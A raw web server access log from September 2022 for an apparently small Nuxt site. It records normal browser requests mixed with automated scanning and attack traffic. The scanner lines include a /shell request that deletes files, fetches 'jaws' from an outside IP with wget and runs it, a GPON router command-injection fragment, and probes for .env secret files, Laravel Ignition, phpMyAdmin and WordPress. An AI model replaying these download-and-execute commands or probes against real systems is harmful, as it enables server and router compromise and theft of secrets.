172.21.0.1 - - [21/Sep/2022:20:01:31 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xFF\xB6\xFB\xA2\x9E\x10hP{\xCD\xBA|$`\xCF\xC7\x17B\x08\xD0-\x1F\xAC\xC5\x16xw\x02|o\xC3\x14 F\xB0\x08F\xAE\xA9\x8A\xA2\xAA" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:14:54:08 +0000] "GET /_nuxt/cee9a5f.js HTTP/1.1" 200 286 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:15:21:17 +0000] "GET / HTTP/1.1" 200 2568 "-" "-"
172.24.0.1 - - [22/Sep/2022:15:56:45 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.24.0.1 - - [22/Sep/2022:15:56:46 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:15:56:46 +0000] "GET /favicon.ico HTTP/1.1" 200 8636 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.24.0.1 - - [22/Sep/2022:16:05:41 +0000] "GET /.env HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.24.0.1 - - [22/Sep/2022:16:45:48 +0000] "GET / HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:16:56:16 +0000] "CONNECT google.com:443 HTTP/1.1" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:17:22:12 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
172.24.0.1 - - [22/Sep/2022:18:00:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" 404 146 "-" "Hello, world"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/6003cb2.js HTTP/1.1" 200 462486 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/528af99.js HTTP/1.1" 200 310256 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/8de3182.js HTTP/1.1" 304 0 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/dd7e543.js HTTP/1.1" 200 420342 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/71f3d38.js HTTP/1.1" 304 0 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/fonts/poppins-v5-latin-regular.4d16d09.woff2 HTTP/1.1" 304 0 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/img/logo.de4e971.png HTTP/1.1" 304 0 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/60e6196.js HTTP/1.1" 200 273 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:18:57:48 +0000] "GET /_nuxt/cee9a5f.js HTTP/1.1" 304 0 "http://localhost/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:05:13 +0000] "MGLNDD_77.40.48.136_80" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:19:07:32 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:19:55:37 +0000] "GET /.env HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:55:38 +0000] "GET /.env.test HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:55:38 +0000] "GET /env.save HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:55:38 +0000] "GET /.env.dev HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:55:39 +0000] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36"
172.24.0.1 - - [22/Sep/2022:19:59:16 +0000] "R/\xEBn]\xE8\xD2]8g\xEF\xCE\x04\xA0jH\xD9\xC6s\x17\xF9\xE21\x17Cn\xF0\xBC\xF5\xE21\x17\xF8\xE6s\x17\xF9\xE22\x1F\xF9\xE21\x17\xF9\xE21\x17S\xE21\x17\xF9\xE2\x1A<\xF9\xE21\x17\xD1\xE21\x17\xF9\xE21\x17\xF9\xE21\x17\xF9\xE21\x17\xF8\xE31\x17\xF9\xE2'\x17\xF9\xE21\x17\xF9\xE21\x17\xF9\xE21\x17\xF9\xE21\x17\xF9\xE25\x17\xF9\xE21\x17\xF9\xE21\x17\x04\x00" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:19:59:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x87\xBA\xA4\xA1\xD0\x7Fa\x93\xBD\xEAHJuG\xB4-\xC2Li\xE6 \x0E@\xB8?q\x90\xD1\xD7>\x00\xAE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:19:59:17 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1FQa\x13e~R\xCFE\x05\xE0\xBD\xD8\xF5GL\xAEw:IEP\x8E\xFB=2\xE9\x97c\xBC\xEE&\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:19:59:18 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 zgrab/0.x"
172.24.0.1 - - [22/Sep/2022:20:01:23 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xDD\x00\x5CjX\xA6\x0F\x8AV$\xDA\xD9\xF1\x9E\xD7$\xB6\xEC\xAA#g\xCB\x8BR6\x86\xCD\xB8l\xE5\xC6\x1A N\x8E\x8D\x94V\xE2\xFF\x87\x89\xB9\xA4\xF2\x93\xD7" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:20:01:25 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\x02X\xACiX\x0F\x046\x04\xC2*\x09\xFD\x1E\x0CmgW\xC7\xB2~4\xD0\x07\x90\xFF\x9D\x80\xD7\x99AQ\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:20:01:26 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02T2\xB2x \x7Fp\xE7\xDEu\xF2\x5C\x1C\x9FSk \x22\xB0\xA3Z\xF9V\xA5$\xF6\x84\x5C\x03\x9C\x1B\xAA\x00\x00\x12\xC0" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:20:01:27 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\x8F\xE1\xED\xDC\xF61dt" 400 150 "-" "-"
172.24.0.1 - - [22/Sep/2022:20:01:38 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.24.0.1 - - [22/Sep/2022:20:01:44 +0000] "GET /favicon.ico HTTP/1.1" 200 8636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.24.0.1 - - [22/Sep/2022:22:58:22 +0000] "GET http://77.40.48.136:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 146 "-" "-"
172.24.0.1 - - [22/Sep/2022:22:58:22 +0000] "GET http://77.40.48.136:80/pma/scripts/setup.php HTTP/1.0" 404 146 "-" "-"
172.24.0.1 - - [22/Sep/2022:22:58:22 +0000] "GET http://77.40.48.136:80/mysql/scripts/setup.php HTTP/1.0" 404 146 "-" "-"
172.24.0.1 - - [23/Sep/2022:11:07:46 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.24.0.1 - - [23/Sep/2022:11:21:38 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
172.24.0.1 - - [23/Sep/2022:11:28:55 +0000] "~WR\x80\x14\x06U\x83`\xD3G\xD6\x15V\x1E\x84" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:11:28:57 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x06\xAC\xA6\xDBu\x9F\x1A\xEB\xD1\xC9\xE6" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:11:28:57 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x036\xC4\xB8\xC5\x97\xAD\xA3V\x17\x13b\xB7@\x8F\xC5\x92\x1F0\x13\x98\x04M\xEEL\x131\x84\xE5\xF9\xBD\xEF\xC4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:12:51:17 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:15:19:12 +0000] "GET /.env HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:15:19:12 +0000] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:15:19:14 +0000] "GET /sendgrid/.env HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:15:19:15 +0000] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:15:46:19 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 146 "-" "Hello, World"
172.24.0.1 - - [23/Sep/2022:15:46:20 +0000] ";sh+/tmp/gpon80&ipv=0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:16:17:15 +0000] "GET /.env HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:16:17:15 +0000] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:17:24:09 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
172.24.0.1 - - [23/Sep/2022:17:24:10 +0000] "GET /HNAP1/ HTTP/1.1" 404 146 "http://77.40.48.136/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
172.24.0.1 - - [23/Sep/2022:18:47:51 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)"
172.24.0.1 - - [23/Sep/2022:19:27:17 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:17 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:17 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:18 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:18 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:18 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:19 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:19 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:19 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:19 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:20 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:20 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:20 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:21 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:21 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:21 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:21 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:22 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:22 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:22 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:23 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:19:27:23 +0000] "" 400 0 "-" "-"
172.24.0.1 - - [23/Sep/2022:20:07:21 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.24.0.1 - - [23/Sep/2022:20:23:01 +0000] "\xE1\xD6\x98\xEC\x09\x8C%\xFB~\xEB\xF3\xF4k\x18\x9F=\x0B\x00\x18'+$Z'\x91\xA8\x9B\x8C'$Z'* \x18'+$Y/+$Z'+$Z'\x81$Z'+$q\x0C+$Z'\x03$Z'+$Z'+$Z'+$Z'*%Z'+$L'+$Z'+$Z'+$Z'+$Z'+$^'+$Z'+$Z'\x04\x00" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:20:23:03 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03;\x12\xD4\x1B%5\xA2\x9C\xE2\x14\x14\xC7:=\x22\x1C\x82g\x18\x86\x09\xE4\x0F\xE0>/\xC7\xDC\xFFl\x00\xFF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:20:23:03 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x90\xBD\x84X\xA4?\x9Dz\xEA\xAF\xD8_X\x8DJ24\xB3+\xDA\xCE\x13tgN\xDFN\xB2\xBCe\x5C\xCD\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:20:23:04 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 zgrab/0.x"
172.24.0.1 - - [23/Sep/2022:20:24:47 +0000] "GET /robots.txt HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:47 +0000] "GET / HTTP/1.1" 200 2568 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:47 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:48 +0000] "GET /blog/robots.txt HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:48 +0000] "GET /blog/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:48 +0000] "GET /wordpress/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:20:24:49 +0000] "GET /wp/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
172.24.0.1 - - [23/Sep/2022:21:00:21 +0000] "m@2\xD8K\xCD7dx\x86F\x0Ft\xD7\x15\xC6" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:21:00:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Nw\x05\x06\x93\x9C\xCF\xC3\x80\xF3\xF3\xFA\xD5]\x19\x1D:\x8Bq\xB4\xBB2\xB0\x02\xC6\xBC8\xCC\x9F\x8C\xE9v\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:21:00:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03C\xC1x\x9AM\xBD\xB9I}\xEA\xD7\xF1\x84V\xEC-\xCF\xC7\x12&'\xDE\xB0\xBC\xB4\xF4\x09\xB9\xF2qt\x97\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.24.0.1 - - [23/Sep/2022:21:37:40 +0000] "GET /.env HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.24.0.1 - - [23/Sep/2022:21:46:47 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:21:46:47 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:21:46:48 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:21:46:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:21:46:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.24.0.1 - - [23/Sep/2022:21:46:51 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
